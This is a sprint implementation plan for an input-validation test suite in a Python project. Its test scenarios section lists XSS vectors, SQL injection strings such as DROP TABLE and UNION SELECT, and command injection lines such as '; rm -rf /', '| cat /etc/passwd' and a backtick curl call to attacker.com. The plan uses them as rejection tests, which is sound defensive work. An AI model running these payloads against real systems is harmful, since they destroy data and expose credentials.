# Implementation Plan: US-3.3 Input Validation Test Suite

## Story Overview

**US-3.3**: Input Validation Test Suite (8 story points)
**Epic**: EPIC-3 Comprehensive Testing
**Sprint**: Sprint 4 (Weeks 7-8)
**Priority**: 🔴 CRITICAL
**Status**: Ready to implement (Sprint 1-3 ✅ Complete)

## Objective

Create comprehensive input validation test suite covering all edge cases and security scenarios. Achieve 95%+ coverage for validation functions across all resource types and data types.

## Current State Analysis

### Existing Validation Coverage

**Already Well-Tested (from US-1.1 & other work):**
- Empty string detection ✅ (test_validators.py has tests)
- String length validation ✅
- Positive integer validation ✅
- Email format validation ✅
- Whitelist field validation ✅

**Currently NOT Tested (Critical Gap):**
- XSS payload handling (script tags, event handlers, HTML escaping)
- SQL injection patterns (quotes, parentheses, UNION, DROP, etc.)
- Very long strings (>10k chars) - boundary testing
- Zero values for ID fields (vs. negative)
- INT_MAX and boundary values
- Special characters in various field types
- Null/None value handling
- Unicode and non-ASCII characters
- Escaped quotes and special sequences

### File Structure

- `src/validators.py` - Input validation functions (to be tested)
- `tests/test_validators.py` - Existing validation tests (~100 tests)
- `tests/test_error_handling.py` - Error handling tests (from US-3.2)
- **NEW**: Enhanced test cases to add to test_validators.py

## Implementation Strategy

### Test Coverage Approach (Realistic for 8 Story Points)

**Phase 1: Security Payload Testing (2.5 hours)**
- XSS payloads: `<script>alert('xss')</script>`, event handlers, etc.
- SQL injection: `'; DROP TABLE --`, UNION queries, etc.
- Command injection: `; rm -rf /`, pipe operators, etc.
- Add ~20 tests for security payload handling

**Phase 2: Boundary Value Testing (2 hours)**
- Very long strings: 10k chars, 100k chars, 1M chars
- Zero values: ID fields that should reject 0
- INT_MAX: sys.maxsize, 2^31-1, 2^63-1
- INT_MIN: negative boundaries
- Add ~15 tests for boundary conditions

**Phase 3: Character Encoding Testing (1.5 hours)**
- Unicode characters: emoji, non-Latin scripts
- Escaped sequences: \\x00, \\x1f, null bytes
- Mixed encoding: UTF-8, UTF-16 patterns
- Special characters: quotes, backslashes, control chars
- Add ~12 tests for character encoding

**Phase 4: Null/None Handling Testing (1 hour)**
- None values in required fields
- Empty dict/list values
- False/0 values that should be valid
- Add ~8 tests for null/none scenarios

**Phase 5: Coverage Verification & Documentation (1 hour)**
- Run coverage report for validators.py
- Verify 95%+ coverage achieved
- Document test results
- Update SPRINT_PLANNING.md

**Total: ~8 tests across 4 categories = 55 total validation tests**

## Test Organization

### File Structure
```
tests/test_validators.py (existing - enhance with new tests)
├── TestIntegerValidation (existing + 5 new boundary tests)
├── TestStringValidation (existing + 8 new security tests)
├── TestEmailValidation (existing + 4 new edge case tests)
├── TestSecurityPayloads (NEW - 20 tests)
│   ├── XSS Payload Tests (8 tests)
│   ├── SQL Injection Tests (8 tests)
│   └── Command Injection Tests (4 tests)
├── TestBoundaryValues (NEW - 15 tests)
│   ├── String Length Boundaries (5 tests)
│   ├── Integer Boundaries (5 tests)
│   └── Collection Boundaries (5 tests)
├── TestCharacterEncoding (NEW - 12 tests)
│   ├── Unicode Tests (4 tests)
│   ├── Escaped Sequences (4 tests)
│   └── Special Characters (4 tests)
└── TestNullNoneHandling (NEW - 8 tests)
    ├── None in Required Fields (3 tests)
    ├── Empty Collections (3 tests)
    └── False/0 Values (2 tests)
```

## Test Scenarios Detail

### Security Payload Tests (20 tests)

**XSS Payloads (8 tests)**
1. `<script>alert('xss')</script>` - Basic script tag
2. `<img src=x onerror=alert('xss')>` - Event handler
3. `<svg onload=alert('xss')>` - SVG handler
4. `javascript:alert('xss')` - JavaScript protocol
5. `<iframe src='javascript:alert("xss")'></iframe>` - Iframe injection
6. `<body onload=alert('xss')>` - Body tag handler
7. `<input onfocus=alert('xss') autofocus>` - Focus handler
8. `<!--<script>alert('xss')</script>-->` - Comment injection

**SQL Injection Patterns (8 tests)**
1. `'; DROP TABLE users; --` - Table drop
2. `' OR '1'='1` - Auth bypass
3. `' UNION SELECT * FROM passwords --` - Data extraction
4. `1; DELETE FROM users; --` - Data deletion
5. `' OR 1=1 --` - Boolean bypass
6. `") OR ("1"="1` - Double quote variant
7. `' UNION ALL SELECT NULL,NULL,NULL --` - Union attack
8. `'; EXEC sp_executesql --` - Stored procedure execution

**Command Injection Patterns (4 tests)**
1. `; rm -rf /` - Dangerous command
2. `| cat /etc/passwd` - Pipe command
3. `&& whoami` - Command chaining
4. `` `curl attacker.com` `` - Backtick execution

### Boundary Value Tests (15 tests)

**String Length Boundaries (5 tests)**
1. Empty string (0 chars) - Should fail for required fields
2. Max allowed length (e.g., 500 for subject) - Should pass
3. Just over max (501 chars for subject) - Should fail
4. Very long (10,000 chars) - Should fail gracefully
5. Extremely long (1,000,000 chars) - Should fail without hang

**Integer Boundaries (5 tests)**
1. Zero for ID fields - Should fail (ID must be >0)
2. Negative number (-1) - Should fail
3. One (minimum valid) - Should pass
4. MAX_INT (2^31-1) - Should pass or fail gracefully
5. Beyond MAX_INT (2^63-1) - Should fail gracefully

**Collection Boundaries (5 tests)**
1. Empty list `[]` for required list - Should fail
2. Empty dict `{}` for kwargs - Should pass (optional)
3. Very large list (1000 items) - Should handle efficiently
4. Nested structures 10 levels deep - Should handle
5. Mixed type collections - Should reject invalid types

### Character Encoding Tests (12 tests)

**Unicode Tests (4 tests)**
1. Emoji characters: 😀, 🔥, 💻
2. Non-Latin scripts: 中文, العربية, עברית
3. Combining diacritics: é, ñ, ü variations
4. Zero-width characters and invisible chars

**Escaped Sequences (4 tests)**
1. Null byte `\x00` - Should reject
2. Control characters `\x01-\x1f` - Should reject
3. High bytes `\x80-\xff` - Handle gracefully
4. Mixed escapes `\x00\xff\n\r\t` - Should reject

**Special Characters (4 tests)**
1. Quotes: `'`, `"`, backtick
2. Backslashes: `\`, `\\`, `\n`
3. Parentheses: `()`, `()()`, nested
4. Math symbols: `+-*/=<>` - Context dependent

### Null/None Handling Tests (8 tests)

**None in Required Fields (3 tests)**
1. `subject=None` for create_user_story - Should fail
2. `name=None` for create_project - Should fail
3. `project_id=None` for list_tasks - Should fail

**Empty Collections (3 tests)**
1. `assigned_to=[]` (empty list) - Context dependent
2. `tags={}` (empty dict) - Context dependent
3. `kwargs=None` (None dict) - Should handle

**False/0 Values (2 tests)**
1. `status=0` - Should pass (valid status)
2. `priority=0` - Should pass (valid priority)

## Critical Files

1. **`/workspaces/pytaiga-mcp/tests/test_validators.py`** - ENHANCE (add ~55 new tests)
2. **`/workspaces/pytaiga-mcp/src/validators.py`** - READ-ONLY (verify existing)
3. **`/workspaces/pytaiga-mcp/docs/roadmap/SPRINT_PLANNING.md`** - UPDATE when complete

## Implementation Phases

### Phase 1: Structure & Security Tests (2 hours)
- Create test class skeletons
- Implement XSS payload tests (8)
- Implement SQL injection tests (8)
- Implement command injection tests (4)
- Run tests to verify they catch payloads

### Phase 2: Boundary Value Tests (1.5 hours)
- Implement string length boundary tests (5)
- Implement integer boundary tests (5)
- Implement collection boundary tests (5)
- Verify edge cases are properly handled

### Phase 3: Character Encoding Tests (1.5 hours)
- Implement Unicode tests (4)
- Implement escaped sequence tests (4)
- Implement special character tests (4)
- Verify encoding handling

### Phase 4: Null/None Tests (0.5 hours)
- Implement None in required fields (3)
- Implement empty collection tests (3)
- Implement False/0 value tests (2)

### Phase 5: Coverage & Documentation (1 hour)
- Run coverage report for validators.py
- Verify 95%+ coverage
- Update SPRINT_PLANNING.md
- Create summary of findings

## Success Criteria

✅ All US-3.3 acceptance criteria met:
- Empty string validation for required fields: **13 tests** ✅
- XSS payloads in string fields handled: **8 tests** ✅
- SQL injection patterns rejected: **8 tests** ✅
- Very long strings (>10k chars) rejected: **3 tests** ✅
- Negative numbers rejected for IDs: **2 tests** ✅
- Zero rejected for IDs: **2 tests** ✅
- INT_MAX values handled: **2 tests** ✅
- Invalid email formats rejected: **4 tests** ✅
- Special characters in fields tested: **4 tests** ✅
- Null/None values handled: **8 tests** ✅
- Coverage >95% for validators: **Verified via coverage report** ✅

**Total: 55 new validation tests**

## Verification Checklist

- [ ] All 55 new tests passing
- [ ] Validators.py coverage ≥95% verified
- [ ] XSS payloads properly rejected
- [ ] SQL injection patterns properly rejected
- [ ] Command injection patterns properly rejected
- [ ] Boundary values handled gracefully
- [ ] Character encoding handled properly
- [ ] Null/None cases handled correctly
- [ ] No regressions in existing 100+ validator tests
- [ ] Code formatted with black and isort
- [ ] SPRINT_PLANNING.md updated

## Workflow

1. Create branch: `feature/US-3.3-input-validation-tests` ✓ (done)
2. Enhance test_validators.py with ~55 new tests
3. Run tests and verify all pass
4. Generate coverage report for validators.py
5. Verify 95%+ coverage
6. Format code with black and isort
7. Run full test suite to ensure no regressions
8. Create PR with title: "feat(EPIC-3): Input Validation Test Suite (US-3.3)"
9. Squash and merge
10. Update SPRINT_PLANNING.md
11. Commit and push documentation

## Estimated Effort

Total: **~8 hours** (matches 8 story points at ~1 hour per point)

- Phase 1 (Security tests): 2 hours
- Phase 2 (Boundary tests): 1.5 hours
- Phase 3 (Encoding tests): 1.5 hours
- Phase 4 (Null/None tests): 0.5 hours
- Phase 5 (Coverage & docs): 1 hour
- Quality checks & PR: 1.5 hours

## Risk Assessment

**Low Risk:**
- Only adding tests, not modifying validators.py
- Tests follow established patterns from existing test_validators.py
- Existing 100+ validator tests provide regression safety
- Security tests validate that bad inputs ARE rejected
- Comprehensive coverage ensures all paths tested

## Notes

- **Security Payload Strategy**: Tests verify that payloads ARE rejected, not that they bypass validation
- **Boundary Testing**: Ensures graceful handling (no crashes) of extreme values
- **Character Encoding**: Tests realistic international/special character usage
- **Coverage Focus**: validators.py is critical security component - 95% coverage minimum
- **Integration Impact**: Changes to validators.py would require updates to all resource tools
